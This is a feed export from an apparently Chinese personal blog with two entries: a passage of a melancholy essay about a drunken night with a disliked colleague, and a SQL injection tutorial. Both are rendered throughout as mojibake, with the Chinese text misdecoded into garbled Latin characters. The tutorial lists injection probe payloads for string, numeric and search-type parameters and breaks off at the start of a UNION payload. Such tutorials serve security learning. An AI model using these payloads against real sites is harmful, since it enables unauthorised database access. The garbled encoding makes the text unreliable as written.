ï¼Œä»€ä¹ˆéƒ½èƒ½æå®šï¼â€</p><p>â€œæˆ‘ä»¬â€¦â€</p><p>â€œæˆ‘ä»¬ä»Šæ™šå»å–é…’å§ï¼â€</p><p>å¯¹é¢çš„ç”·äººåˆšè¦è¯´è¯ï¼Œå¬è§å¥¹è¯´å–é…’ï¼Œç«‹é©¬å…´å¥‹äº†èµ·æ¥ï¼Œè¿å£°ç­”åº”ï¼Œå˜´é‡Œä¸åœè§„åˆ’ç€å¥¹è°ƒå›æ¥åçš„å¿«ä¹åŒäº‹ç”Ÿæ´»ã€‚</p><p>æŒ‚äº†ç”µè¯ï¼Œèƒƒé‡Œæ³›èµ·ä¸€é˜µæ¶å¿ƒï¼Œæ˜æ˜å·²ç»å¥½ä¹…æ²¡æœ‰è·Ÿä»–æœ‰æ¥è§¦äº†ï¼Œå¬åˆ°ä»–çš„å£°éŸ³ä¸ºä»€ä¹ˆè¿˜æ˜¯ä¼šè¿™ä¹ˆåæ„Ÿã€‚äººå®åœ¨æ˜¯ä¸€ä¸ªç¥å¥‡çš„åŠ¨ç‰©ï¼Œå¥¹æ›¾ç»ä¸€æ¬¡åˆä¸€æ¬¡å‘Šè¯‰è‡ªå·±è¦æ³›çˆ±ä¸‡ç‰©ï¼Œå‘Šè¯‰è‡ªå·±ï¼Œâ€œå‡¡æ‰€æœ‰ç›¸è€…ï¼Œçš†æ˜¯è™šå¦„â€ï¼Œä½†è®¨åŒçš„æƒ…ç»ªæ˜¯æ‘†è„±ä¸æ‰çš„ï¼Œå°±åƒå¥¹æ— è®ºå¦‚ä½•ä¹Ÿä¼šè§‰å¾—æ¥¼ä¸‹çš„å°çŒ«å’ªå¯çˆ±ã€‚</p><p>é‚£å°±ç—›è‹¦å§ã€‚</p><p>å–é…’çš„æ—¶å€™ï¼Œå¥¹æ˜¯å¦ä¸€ä¸ªäººï¼Œé‚£ä¸ªäººï¼Œæ²¡å¿ƒæ²¡è‚ºï¼Œå˜´é‡Œåªä¼šå¿µå¨ç€ä¸æ˜æ‰€ä»¥çš„ä¸œè¥¿ï¼Œä¼šæ¯«æ— ä¿ç•™çš„çƒ­çˆ±æ¯ä¸€ç‰‡èŠ±æ¯ä¸€æ£µæ ‘ï¼Œä¼šå¿˜è®°ï¼Œè¿™ä¸ªä¸–ç•Œä¸Šæœ‰çš„å¤œæ™šä¼šå¯‚å¯çš„è®©äººå“­ä¸å‡ºå£°ã€‚</p><p>â€œæ‚ â€ï¼Œå¥¹è®¨åŒè¿™ä¸ªåå­—ï¼Œä¹Ÿè®¨åŒæ­£å«ç€è¿™ä¸ªåå­—çš„äººï¼Œä»–ååœ¨å¯¹é¢ï¼Œå°å¿ƒç¿¼ç¿¼çš„å¤¹ç€èœï¼Œçœ¼é‡Œæ˜¯æ¬²æœ›å’Œä¸‘é™‹ã€‚ä¸‘é™‹ï¼Œæ²¡æœ‰ç†ç”±çš„ä¸‘é™‹ï¼Œå¥¹å’Œä»–æ›¾ç»æ˜¯å¥½æœ‹å‹ï¼Œå¥¹ä¼šæ¿€åŠ¨çš„è·Ÿä»–åˆ†äº«å¥¹æ–°çœ‹çš„æ¼«ç”»æƒ…èŠ‚æœ‰å¤šç¦»è°±ï¼Œä¼šæ‹‰ç€ä»–é€ƒæ‰å·¥ä½œå»æ¸¸ä¹å›­ç©ä¸Šä¸€å¤©ï¼Œä¼šå’Œä»–æ•´å¤œæ•´å¤œçš„èŠå¤©â€¦å¯æ˜¯æŸä¸€å¤©ç¡é†’äº†è¿‡åï¼Œä¸€ç§è®¨åŒçš„æƒ…ç»ªå°±åœ¨æ…¢æ…¢æ»‹ç”Ÿï¼Œæ¶ç˜¤ä¸€æ—¦äº§ç”Ÿï¼Œå°±ä¼šå‘äº†ç–¯ä¼¼çš„ç¹æ®–å£®å¤§ã€‚å…¨èº«éƒ½è¢«è¿™ç§ç—…æ¯’æ‰€ä¾µèš€ï¼Œå–˜ä¸è¿‡æ°”æ¥ï¼Œæ›¾ç»çš„æµªæ¼«éƒ½å˜æˆäº†ç—›æ¨ã€‚æ›´å¤šæ—¶å€™å¥¹å¼ºè¿«è‡ªå·±æ˜¯ä¸€ä¸ªå±€å¤–äººï¼Œéº»æœ¨çš„çœ‹ç€è¿™æ´ªæ°´æ³›æ»¥èˆ¬çš„æ‚²å‰§åœ¨ä¸Šæ¼”ï¼Œå¥½å§ï¼Œä¸€ç§å¾ˆç¾å¥½çš„ä¸œè¥¿æ­£åœ¨å¥¹çš„èº«ä½“é‡Œæµèµ°ï¼Œæ²¡æœ‰ä»»ä½•ç†ç”±çš„ï¼Œä¸€ä¸ªåŠ²çš„å¾€å¤–æµï¼Œä½†å¥¹ç´¯äº†ï¼Œä¸æƒ³çº ç»“å…¶ä¸­çš„ç¼˜ç”±äº†ã€‚</p><p>â€œä»Šæ™šåˆ«å–å¤šäº†ï¼Œä½ ä¹ŸçŸ¥é“ä½ çš„é…’é‡ï¼Œå–å¤šäº†å°±åˆ°å¤„å‘ç–¯ï¼Œä½ é©¬ä¸Šå°±è¦è°ƒå›æ¥äº†ï¼Œå…³é”®æ—¶åˆ»å¯åˆ«å‡ºä»€ä¹ˆä¹±å­ã€‚â€â€œå—¯â€¦..å—¯ï¼Ÿâ€å¥¹ç¬‘äº†ç¬‘ï¼Œä¸¾èµ·é…’æ¯è¯´ï¼Œâ€œä½ çŸ¥é“ç‰æ—è·¯é‚£è¾¹é‚£æ¡è€è¡—å—ï¼Œé‚£é™„è¿‘æœ‰å¾ˆå¤šå°é…’é¦†ï¼Œé©»åœºæ˜¯æˆ‘å–œæ¬¢çš„é£æ ¼ã€‚ä½ ä¸€å®šè¦å¬ä¸€å¬ï¼Œè‰ä¸œçš„æ–°æ­Œâ€¦.â€å¥¹è‡ªé¡¾è‡ªçš„è¯´ç€ï¼Œä¸æƒ³å¬è§ä»–çš„å£°éŸ³ï¼Œä¸æƒ³çœ‹è§ä»–çš„è„¸ï¼Œçˆ±æƒ…æ˜¯ä»€ä¹ˆæ ·å­çš„å¥¹æ—©å°±å¿˜è®°äº†ï¼Œå¥¹ä¸æ˜¯å—æ¬¢è¿çš„ç±»å‹ï¼Œåœ¨çŸ­æš‚çš„ç»å†è¿‡æ•°ä¸æ¸…çš„æš—æ‹ä¹‹åä¾¿åŒå€¦äº†ï¼Œæ…¢æ…¢æ˜ç™½è¿™ç©æ„é™¤äº†æ¬²æœ›å’Œè‡ªæˆ‘æ„ŸåŠ¨ä¹‹å¤–ä¹Ÿæ²¡å‰©ä¸‹ä»€ä¹ˆã€‚è™½ç„¶å¥¹å¹¶ä¸åæ‚”æ›¾ç»åœ¨æ— æ•°ä¸ªå¤œæ™šå‘äº†ç–¯ä¼¼çš„æ¸´æœ›å®ƒï¼Œåœ¨æ—¥è®°æœ¬ä¸Šä¸€éåˆä¸€éçš„æå†™å®ƒçš„å½±å­ï¼Œæé€ å‡ºä¸€é¦–åˆä¸€é¦–æœ¦èƒ§çš„å°è¯—ï¼Œåªæ˜¯ç°åœ¨ä¸ä¼šè¿™ä¹ˆå¹²äº†ç½¢ã€‚</p><p>æ¿€æƒ…ä¹Ÿå¥½ï¼ŒåŒå€¦ä¹Ÿç½¢ï¼Œéƒ½æ˜¯ç‹—shiï¼Œè¿˜æ˜¯æ´»ç€æœ€çœŸå®ã€‚</p><p>å†å›è¿‡ç¥æ¥çš„æ—¶å€™ï¼Œå¥¹å’Œä»–åœ¨è¡—é“ä¸Šç‹‚å¥”ï¼â€œåˆ«è¿‡æ¥ï¼æˆ‘ï¼Œæˆ‘è¦æŠ¥..è­¦äº†ï¼â€ä»–ç¬‘ç€è¿½ï¼Œâ€œåˆ«é—¹ï¼æˆ‘ä»¬å¿«å›å»å§ï¼â€å¥¹ä¸åœçš„è·‘ï¼Œä¸åœçš„è·‘ï¼Œè„±ä¸‹æ‰‹ä¸Šçš„æ‰‹è¡¨ä¸¢è¿›åƒåœ¾æ¡¶ï¼å¥½è½»æ¾ï¼ŒçœŸæƒ³å†å–ä¸¤å£ç±³é…’ï¼Œå¥½ç”œï¼Œå–äº†é‚£å£¶é…’ï¼Œçœ¼æ³ªä¹Ÿèƒ½æ˜¯ç”œçš„å§ï¼Œå˜»å˜»ï¼Œæˆ‘æ‰ä¸è¦å°æˆ‘çš„çœ¼æ³ªï¼Œä¸è¿‡è‚¯å®šæ˜¯ç”œçš„ï¼å¥¹æƒ³è·‘åˆ°å¿ƒä»ªçš„æˆ¿å­å¤–é¢å†çœ‹ä¸¤çœ¼ï¼Œé‚£å¯æ˜¯è¿™ä¸ªä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªå³å°†å±äºè‡ªå·±çš„ï¼Œåªå±äºè‡ªå·±çš„å®¶ã€‚ä½†æ˜¯å¥¹ç´¯äº†ï¼Œåœåœ¨å…¬å›­é‡Œçš„ä¸€ä¸ªæ¤…å­å‰ï¼Œæ¤…å­ä¸Šåç€ä¸€ä¸ªå¤±æ„å°‘å¹´ï¼Œ15,6å²çš„æ ·å­ï¼Œçœ‹è§å¥¹ä¸€èº«é…’æ°”ï¼Œæ»¡è„¸æƒŠæ„•çš„èµ°å¼€äº†ã€‚æœ›ç€é‚£ä¸ªå¹´è½»çš„èƒŒå½±ï¼Œå¥¹è§‰å¾—å¥½å¸…ï¼Œå‘¨å›´çš„è·¯ç¯æ˜¯å¥¹çˆ±çš„ç»¿è‰²ï¼Œå°‘å¹´ç©¿çš„æ¿é‹æ˜¯ä»–å–œæ¬¢çš„æ¬¾å¼ï¼Œè¡£æœå¾ˆåˆèº«ï¼Œåœ¨å‘¨å›´çš„è‰çš„æ˜ è¡¬ä¸‹ï¼Œå¾ˆå¥½çœ‹ã€‚èº«åçš„ç”·äººè¿½ä¸Šæ¥äº†ï¼Œâ€œå°æ™ºæ™ºï¼â€å¥¹å«ç€ä»–çš„å°åï¼Œä¸æ¯«ä¸è§‰å¾—ç¾è€»ï¼Œçœ‹ç€ä»–å® æººçš„çœ¼ç¥æ‰“åœ¨è‡ªå·±è„¸ä¸Šï¼Œè¿™ä¸€åˆ‡éƒ½å¥½å¥½ç¬‘ã€‚</p><p>æ¤…å­ä¸Šä¾åçš„ä¸€å¯¹ç”·å¥³ï¼Œå¾ˆå®‰é™çš„å¬ç€è™«é¸£ï¼Œæ€€é‡Œçš„å¥³ç”Ÿè¿˜åœ¨å‘ç–¯ä¼¼çš„èƒ¡è¨€ä¹±è¯­ï¼Œè„‘å­é‡Œæƒ³çš„æ˜¯ä»–é‚£ä¸ªé¢†å¯¼çˆ¸çˆ¸ï¼Œæ˜æ˜ä»€ä¹ˆéƒ½ä¸ç”¨ä¼šå´å¯ä»¥ä¸€è¾¹ä½¿å”¤äººä¸€è¾¹é¢†é«˜è–ªï¼Œå¥¹æƒ³ï¼Œä¹Ÿè®¸å¥¹ä¹Ÿæ˜¯æƒ³è¿‡è¿™æ ·çš„ç”Ÿæ´»çš„ï¼Œè‡³å°‘ä¸ä¼šæ‹’ç»ï¼Œå“ˆå“ˆâ€¦â€œè¯¶ï¼Œä½ çœ‹æ²¡çœ‹è¿‡å¼—æ´›ä¼Šå¾·çš„ä¹¦â€¦æ²¡çœ‹è¿‡ï¼Ÿå“ï¼Œæˆ‘è®°å¾—ï¼Œå“ªä¸€å¹´æ¥ç€â€¦äºŒä¸‰â€¦ä¸å¯¹ï¼ŒäºŒäºŒå¹´å§ï¼Œå“ªä¸€å¹´çœŸæ˜¯ç°æš—å•Šã€‚å¯¹äº†ï¼Œâ€˜death driveâ€™ï¼Œå¬è¿‡å—ï¼Œæ­»äº¡é©±åŠ›ï¼Œæ˜¯ä¸æ˜¯è¶…é…·â€¦å“ˆå“ˆå“ˆï¼Œæ­»äº¡é©±åŠ›â€¦â€ â€œæ‚ â€ä»–æ‰“æ–­å¥¹çš„è¯ï¼Œç”¨ä¸€ç§æ¸©æŸ”çš„è¯­æ°”è¯´ï¼Œ</p><p>â€œä½ çŸ¥é“ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆå–œæ¬¢ä½ å—ï¼Ÿâ€ä»–çš„æ‰‹æ•åœ¨å¥¹è€³è¾¹ï¼Œâ€œæˆ‘ä¸å¸Œæœ›ä½ è¿™æ ·ä¸è¦å‘½çš„å–é…’ï¼Œä½†æ˜¯ä½ é†‰é…’çš„æ ·å­ï¼ŒçœŸçš„å¥½è¿·äººã€‚çœ‹è§ä½ ï¼Œæˆ‘å°±è§‰å¾—è¿™ä¸ªä¸–ç•Œçš„ä¸€åˆ‡é“å¾·æ³•å¾‹å…¨éƒ¨è¢«æ‰“ç ´ï¼Œä½ å¸¦æˆ‘æ¥åˆ°äº†ä¸€ä¸ªåŸå§‹ä¸–ç•Œï¼Œä¸€ä¸ªå…¨æ˜¯å¿«ä¹çš„ä¸–ç•Œâ€</p><p>ä¸€ä¸ªå…¨æ˜¯å¿«ä¹çš„ä¸–ç•Œï¼Œå¥¹æ€ä¹ˆåªçœ‹å¾—åˆ°æ‚²ä¼¤å‘¢â€¦</p><p>â€œæ‚ ï¼Œåˆ«å†ç»™è‡ªå·±å‹åŠ›äº†ï¼Œå’Œæˆ‘åœ¨ä¸€èµ·å§ï¼Œä¸‹ä¸ªæœˆæˆ‘å°±åœ¨å¸‚ä¸­å¿ƒä¹°å¥—æˆ¿ï¼Œå†™æˆ‘ä»¬ä¸¤ä¸ªäººçš„åå­—ï¼Œæˆ‘æ˜¯è®¤çœŸçš„ï¼Œæˆ‘ä»¬â€¦.â€</p><p>â€œä½ â€¦ä½ ä»Šå¤©çš„è¡£æœâ€¦å¥½ï¼Œå¥½é¦™ï¼â€</p><p>â€œæˆ‘çŸ¥é“ï¼Œè¿™æ˜¯ä½ å–œæ¬¢çš„å‘³é“ï¼Œä½ ç»™æˆ‘è¯´è¿‡çš„â€ï¼Œç”·äººæ¸©æŸ”çš„å£°éŸ³é€æ¸è¿œå»ï¼Œæ¶ˆå¤±åœ¨ä¸€ç‰‡è¿·é›¾é‡Œï¼Œç«ä¹Ÿç†„ç­äº†ã€‚</p><p>å¥¹å¥½åƒé—»åˆ°äº†å°æ—¶å€™ï¼Œå¥¶å¥¶çƒ¤ç‰ç±³çš„å‘³é“ï¼Œè®°å¿†ä¸­é‚£ä¸ªç‰ç±³å¹¶ä¸å¥½åƒï¼Œå¯æ˜¯çƒ¤ç‰ç±³çš„æ—¶å€™ï¼Œæœ¨ç‚­å’Œç‰ç±³åœ¨æ¸©åº¦çš„é…¿é€ ä¸‹ï¼Œæ•£å‘å‡ºä¸€ç§æ— ä¸ä¼¦æ¯”çš„é¦™å‘³ï¼Œè¿™ä¸–ä¸Šç»æ²¡æœ‰ç¬¬äºŒç§å‘³é“èƒ½æ¯”çƒ¤ç‰ç±³çš„å‘³é“é¦™ã€‚çƒ¤ä¸€ä¸ªç‰ç±³è¦ç­‰å¥½ä¹…å¥½ä¹…ï¼Œç‰ç±³è¡¨é¢æ…¢æ…¢ä»é‡‘é»„å˜æˆæ·±ç„¦ç³–è‰²ï¼Œå¤ªé˜³ä¼šæ—©æ—©è½å±±ï¼Œæ°´æµçš„å£°éŸ³å’Œç«æ˜Ÿè·³åŠ¨çš„å£°éŸ³äº¤ç»‡åœ¨ä¸€èµ·ï¼Œè¿œå¤„æœ‰ä¸€é¢—å·¨å¤§æ— æ¯”çš„æ¨±æ¡ƒæ ‘ï¼Œåªæœ‰æ ‘é¡¶ä¸Šè¿˜æœ‰äº›è®¸çº¢é€äº†çš„æ¨±æ¡ƒï¼Œæ‹¼äº†å‘½çš„å›å¿†ï¼Œä¹Ÿè¿˜æ˜¯æƒ³ä¸èµ·æ¥é‚£å¤©é‚£ä¸ªç‰ç±³åˆ°åº•æ˜¯ä»€ä¹ˆæ»‹å‘³ã€‚å¥½æƒ³å†åƒä¸€å£çƒ¤ç‰ç±³ï¼Œå¥¹è¿™æ ·æƒ³ç€ã€‚ç„¶åè¯´</p><p>â€œé‚£æˆ‘å¯ä»¥å…»ä¸€åªå°çŒ«å’ªå—ï¼Ÿâ€</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥</title>
      <link href="/2023/05/14/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/14/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨æƒé™éªŒè¯é€šè¿‡çš„æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥æ•°æ®ä¸sqlè¯·æ±‚æ‹¼æ¥ï¼ŒåŠ¨æ€çš„æ„é€ sqlè¯­å¥ï¼Œå¹¶åœ¨æ— ä»»ä½•å®¡æŸ¥çš„ æƒ…å†µä¸‹ç›´æ¥æ“ä½œæ•°æ®åº“ã€‚</p><h3 id="å‘ç°"><a href="#å‘ç°" class="headerlink" title="å‘ç°"></a>å‘ç°</h3><h4 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h4><ol><li>GET</li><li>POST</li><li>Cookie</li><li>httpå¤´</li><li>request</li></ol><h4 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h4><h6 id="1-å­—ç¬¦å‹"><a href="#1-å­—ç¬¦å‹" class="headerlink" title="1.å­—ç¬¦å‹"></a>1.å­—ç¬¦å‹</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Â 1.ç»å…¸æ–¹æ³•</span><br><span class="line">Â id=1   #æ­£å¸¸</span><br><span class="line">Â id=1&#x27;  #å¼‚å¸¸æˆ–ä¸ºç©º</span><br><span class="line">Â id=1&#x27; and &#x27;1&#x27;=&#x27;1  #æ­£å¸¸</span><br><span class="line">Â id=1&#x27; and &#x27;1&#x27;=&#x27;2  #å¼‚å¸¸æˆ–ä¸ºç©º</span><br><span class="line">Â â€‹</span><br><span class="line">Â 2.ç½‘ç«™æœ‰åŸºæœ¬é˜²æŠ¤</span><br><span class="line">Â åœ¨URLçš„åœ°å€åé¢åŠ ä¸Š&#x27;%2B&#x27;  ï¼ˆ%2B æ˜¯ + çš„URLç¼–ç ã€‚ï¼‰</span><br><span class="line">Â æ‹¼æ¥è¯­å¥ï¼šselect * from users where id = &#x27;1&#x27;+&#x27;&#x27; limit 0,1; #æ­£å¸¸</span><br></pre></td></tr></table></figure><p>å¯¹äºç¬¬äºŒç‚¹ï¼š</p><p><a href="https://blog.51cto.com/binghe001/5246926">å‚è€ƒæ–‡ç« </a></p><p>ç°åœ¨æœ‰å¾ˆå¤šé˜²æ³¨å…¥ç¨‹åºå±è”½äº† andã€1&#x3D;1ã€1&#x3D;2 ç±»ä¼¼è¿™æ ·çš„å…³é”®å­—ï¼Œä½¿ç”¨è¿™æ ·çš„æ–¹æ³•æœ‰æ—¶ä¸èƒ½æ¢æµ‹åˆ°æ³¨å…¥ç‚¹äº†ã€‚</p><p>åœ¨urlåé¢è¿›è¡Œä¸€äº›æ“ä½œæ³¨å…¥ä»ç„¶å¯ä»¥çœ‹å‡ºæ³¨å…¥ç‚¹</p><p>å‡è®¾æœ‰ä¸€ä¸ªé¡µé¢ï¼ŒURLæ˜¯<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a></p><ul><li>åœ¨URLåœ°å€åé¢åŠ ä¸Š-1ï¼ŒURLå˜æˆï¼š<a href="http://192.168.109.139/news.asp?id=123-1">http://192.168.109.139/news.asp?id=123-1</a>ï¼Œå¦‚æœè¿”å›çš„é¡µé¢å’Œå‰é¢ä¸åŒï¼Œæ˜¯å¦ä¸€åˆ™æ–°é—»ï¼Œåˆ™è¡¨ç¤ºæœ‰æ³¨å…¥æ¼æ´ï¼Œæ˜¯æ•°å­—å‹çš„æ³¨å…¥æ¼æ´;åœ¨ URLåœ°å€åé¢åŠ ä¸Š -0ï¼ŒURLå˜æˆ <a href="http://192.168.109.139/news.asp?id=123-0">http://192.168.109.139/news.asp?id=123-0</a>ï¼Œè¿”å›çš„é¡µé¢å’Œå‰é¢çš„é¡µé¢ç›¸åŒï¼ŒåŠ ä¸Š-1ï¼Œè¿”å›é”™è¯¯é¡µé¢ï¼Œåˆ™ä¹Ÿè¡¨ç¤ºå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œæ˜¯æ•°å­—å‹çš„ã€‚</li></ul><p>å¦åˆ™ï¼š</p><ul><li>åœ¨URLçš„åœ°å€åé¢åŠ ä¸Šâ€™%2Bâ€™ï¼ŒURLåœ°å€å˜ä¸ºï¼š<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a>â€˜%2Bâ€™ï¼Œè¿”å›çš„é¡µé¢å’Œ1åŒ;åŠ ä¸Šâ€™%2Bâ€™asdfï¼ŒURLåœ°å€å˜ä¸ºï¼š<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a>â€˜%2Basdfï¼Œè¿”å›çš„é¡µé¢å’Œ1ä¸åŒï¼Œæˆ–è€…è¯´æœªå‘ç°è¯¥æ¡è®°å½•ï¼Œæˆ–è€…é”™è¯¯ï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ˜¯æ–‡æœ¬å‹çš„ã€‚</li></ul><p>ä¸ºä»€ä¹ˆï¼Ÿ</p><p>åç«¯è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select * from news where id=123</span><br></pre></td></tr></table></figure><p>æ•°å­—å‹çš„ç›´æ¥-1,å°±å¯ä»¥å˜æˆ<code>where id = 122</code></p><p>å¦‚æœä¸æ˜¯æ•°å­—å‹æ˜¯ä¸ä¼šå˜æˆ122çš„</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åŠ ä¸Š<code>&#39;%2B&#39;</code>,%2B æ˜¯ + çš„URLç¼–ç ã€‚</p><p>è¯­å¥å˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select * from news where id=&#x27;123&#x27;+&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>+</code>æ˜¯æ‹¼æ¥ç¬¦å·ï¼Œä¹Ÿå°±æ˜¯123å’Œç©ºç™½æ‹¼æ¥è¿˜æ˜¯123</p><p>å¦‚æœåŠ ä¸Š<code>&#39;%2B&#39;asdf</code></p><p>è¯­å¥å˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select * from news where id=&#x27;123&#x27;+&#x27;asdf&#x27;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯<code>where id=&#39;123asdf&#39;</code> -&gt; å‡ºç°é”™è¯¯</p><h6 id="2-æ•°å­—å‹"><a href="#2-æ•°å­—å‹" class="headerlink" title="2.æ•°å­—å‹"></a>2.æ•°å­—å‹</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Â 1ã€ç»å…¸æ–¹æ³•</span><br><span class="line">Â è¿‡æ»¤ä¹‹åå¯ä»¥å°è¯•ä¸‹é¢çš„</span><br><span class="line">2ã€ä½¿ç”¨or 2&gt;1;or 1&gt;2(ä¹Ÿå°±æ˜¯æœ‰äº›é»‘åå•åªæœ‰andæ²¡æœ‰or)</span><br><span class="line">Â 3ã€xor 1=1;xor 1=2(åŸç†åŒä¸Š)</span><br><span class="line">Â 4ã€æŠŠand 1=1è½¬æ¢æˆURLç¼–ç (getå‹)</span><br><span class="line">Â 5ã€ä½¿ç”¨-1;-0</span><br><span class="line">Â å¦‚æœè¿”å›çš„é¡µé¢å’Œå‰é¢ä¸åŒï¼Œæ˜¯å¦ä¸€åˆ™æ–°é—»ï¼Œåˆ™è¡¨ç¤ºæœ‰æ³¨å…¥æ¼æ´ï¼Œæ˜¯æ•°å­—å‹çš„æ³¨å…¥æ¼æ´;</span><br><span class="line">Â åœ¨ URLåœ°å€åé¢åŠ ä¸Š -0ï¼ŒURLå˜æˆ news.asp?id=123-0ï¼Œè¿”å›çš„é¡µé¢å’Œå‰é¢çš„</span><br><span class="line">Â é¡µé¢ç›¸åŒï¼ŒåŠ ä¸Š-1ï¼Œè¿”å›é”™è¯¯é¡µé¢ï¼Œåˆ™ä¹Ÿè¡¨ç¤ºå­˜åœ¨æ³¨å…¥æ¼æ´.</span><br></pre></td></tr></table></figure><h6 id="3-æœç´¢å‹"><a href="#3-æœç´¢å‹" class="headerlink" title="3.æœç´¢å‹"></a>3.æœç´¢å‹</h6><p>æœç´¢å‹SQLè¯­å¥æ˜¯ç”¨likeåŠ ä¸Šé€šé…ç¬¦æ¥å®ç°ã€‚</p><p>è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â SELECT*from database.table where users like &#x27;%è¦æŸ¥è¯¢çš„å…³é”®å­—%&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„%å°±æ˜¯åŒ¹é…ä»»ä½•å­—ç¬¦çš„é€šé…ç¬¦ï¼Œå¸¸è§çš„é€šé…ç¬¦è¿˜æœ‰ä»¥ä¸‹è¿™äº›ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â % Â   -&gt; Â  Â  ä»£è¡¨é›¶ä¸ªæˆ–è€…å¤šä¸ªå­—ç¬¦</span><br><span class="line">Â _ Â   -&gt; Â  Â  ä»…æ›¿ä»£ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">Â [xxx] Â  Â  Â  Â  Â  Â  -&gt; Â  å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ Â  Â  Â  </span><br><span class="line">Â [!xxx]æˆ–è€…[^xxx] Â  -&gt; Â  ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</span><br></pre></td></tr></table></figure><p>ç°åœ¨æƒ³åŠæ³•æ„é€ ä¸€ä¸‹payloadï¼š</p><p>æˆ‘ä»¬åœ¨æœç´¢æ¡†è¾“å…¥<code>æ%â€˜andâ€™1â€™=â€˜1â€™ and&#39;%â€™=â€™</code></p><p>sqlè¯­å¥å˜æˆ<code>SELECT*from database.table where users like &#39;%æ%&#39;and&#39;1&#39;=&#39;1&#39; and&#39;%&#39;=&#39;%&#39;</code> è¿™ä¸ªè¯­å¥å°±å¾ˆæ­£å¸¸ä¸ä¼šæŠ¥é”™</p><blockquote><p>ç®€å•çš„åˆ¤æ–­æœç´¢å‹æ³¨å…¥æ¼æ´å­˜åœ¨ä¸å­˜åœ¨çš„åŠæ³•æ˜¯å…ˆæœç´¢â€™ï¼Œå¦‚æœå‡ºé”™ï¼Œè¯´æ˜90%å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ç„¶åæœ ç´¢%ï¼Œå¦‚æœæ­£å¸¸è¿”å›ï¼Œè¯´æ˜95%æœ‰æ´äº†ã€‚</p></blockquote><p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>è¾“å…¥<code>&#39;</code> åˆ™SQLè¯­å¥å˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â SELECT*from database.table where users like &#x27;%&#x27;%&#x27; Â  Â  Â  Â  Â  #è¿™ä¸ªè¯­å¥æ˜¯é”™è¯¯çš„ï¼Œä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>%</code> åˆ™SQLè¯­å¥å˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â SELECT*from database.table where users like &#x27;%%%&#x27; Â  Â  Â  Â  Â  #è¿™ä¸ªè¯­å¥æ˜¯æ­£ç¡®çš„ï¼Œå³æœç´¢å…¨éƒ¨çš„å†…å®¹</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æ¢æµ‹ï¼Œè¾“å…¥å¦‚ä¸‹ä¸¤æ¡è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â æ“ä½œï¼šÂ å…³é”®å­—%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;% #æ­£å¸¸Â å…³é”®å­—%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;% #å¼‚å¸¸</span><br></pre></td></tr></table></figure><p>å¼€å§‹çˆ†ä¸œè¥¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â %&#x27; union 